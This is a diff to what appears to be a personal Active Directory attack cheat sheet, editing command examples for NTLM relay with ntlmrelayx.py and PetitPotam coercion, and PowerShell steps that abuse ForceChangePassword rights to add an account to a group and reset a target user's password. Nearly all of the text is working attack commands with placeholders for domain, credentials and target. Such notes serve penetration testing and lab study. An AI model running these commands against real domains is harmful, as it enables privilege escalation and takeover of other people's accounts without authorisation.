@@ -72,7 +72,7 @@ https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-ef
 
 ```shell
 # listening
-python3 ntlmrelayx.py --remove-mic --escalate-user hack -t ldap://<attacker ip> -smb2support  
+python3 ntlmrelayx.py --remove-mic --escalate-user <username> -t ldap://<attacker ip> -smb2support  
 # launch
 python3 PetitPotam.py -d <domain> -u <username> -p <password> <attacker ip> <target ip>
 ```
@@ -261,12 +261,16 @@ Set-DomainUserPassword -Identity administrator -AccountPassword $UserPassword -C
 - ForceChangePassword
 
 ```powershell
-# member who has permission 
+# group member who has permission
+Add-ADGroupMember "<groupname>" -Members "<ADAccount>" 
+# checking user alreay in the group
+Get-ADGroupMember -Identity "<groupname>"
+# start to change password 
 $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential ("<ADAccount>", $password )
 # using same password to change target user's password
 Set-ADAccountPassword -Identity "<Target ADAccount>" -Reset -NewPassword $password -Credential $cred
-# access denied 
+# if access denied, reconnect
 gpupdate /force
 
 # we can use Enter-PSSession to connect to target host
